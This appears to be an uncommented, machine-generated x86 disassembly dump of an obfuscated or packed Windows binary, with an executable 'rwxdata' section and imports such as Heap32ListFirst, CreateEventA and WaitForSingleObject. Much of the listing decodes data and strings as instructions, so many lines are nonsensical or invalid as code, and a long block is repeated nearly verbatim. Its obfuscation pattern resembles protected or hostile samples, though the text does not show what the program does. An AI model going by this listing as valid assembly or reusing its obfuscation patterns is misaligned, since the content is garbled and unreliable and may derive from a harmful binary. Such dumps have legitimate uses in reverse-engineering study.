push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
jpe rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
je rwxdata
jns rwxdata
jne rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_4d11da
pushad
mov [ esp ] cl
lea esp [ esp + 0x30 ]
call sub_514aff
push eax
pushfd
call sub_515f9d
add [ eax ] al
push edx
insd
outsd
jbe rwxdata
cmp ecx 0xfaa5d599
cmp eax 0x7f
pushad
pushad
jmp rwxdata
inc esp
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov [ esp + 0x10 ] edx
lea esp [ esp + 0x40 ]
ja rwxdata
add [ ebx - 0x3c6df0b6 ] dh
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
jmp rwxdata
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
call sub_514a7e
add [ eax ] al
push ecx
jne rwxdata
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
add eax 0x68b91a8f
jb rwxdata
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
fwait
mov esi 0x83dc4649
out dx al
adc [ eax - 0x3 ] esi
test eax 0x591e91ca
sbb [ edx - 0x30 ] cl
shl bl 0x1
fiadd [ 0x68b91a8f ]
inc ebp
fcom [ edi - 0xc ]
sar [ ebp - 0x1c ] 0x1
push ebx
jb rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
jge rwxdata
imul esp [ ebx + 0x65 ] 0x74617453
jne rwxdata
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
inc eax
mov dh [ ebp + 0x348c9c36 ]
shl bl 0x1
fisubr [ esi ]
scasb [ edi ]
cmp eax 0xbe9bb3ec
dec ecx
rcr [ ecx + 0x68dee75f ] 0xcc
dec esi
0xcdb4
add [ ebp + 0xf102464 ] cl
xchg ecx esp
xchg ebx eax
sti
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
jmp rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
mov bl 0x4a
setb bl
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
jpe rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
je rwxdata
jns rwxdata
jne rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_4d124a
lea esp [ esp + 0x8 ]
jae rwxdata
push esi
dec bl
pushfd
inc ecx
add esp 0x8
bt bx 0x5
test bh cl
cmp ecx 0xfaa5d599
cmp eax 0x7f
pushad
pushad
jmp rwxdata
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
mov [ esp + 0x10 ] edx
lea esp [ esp + 0x40 ]
ja rwxdata
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
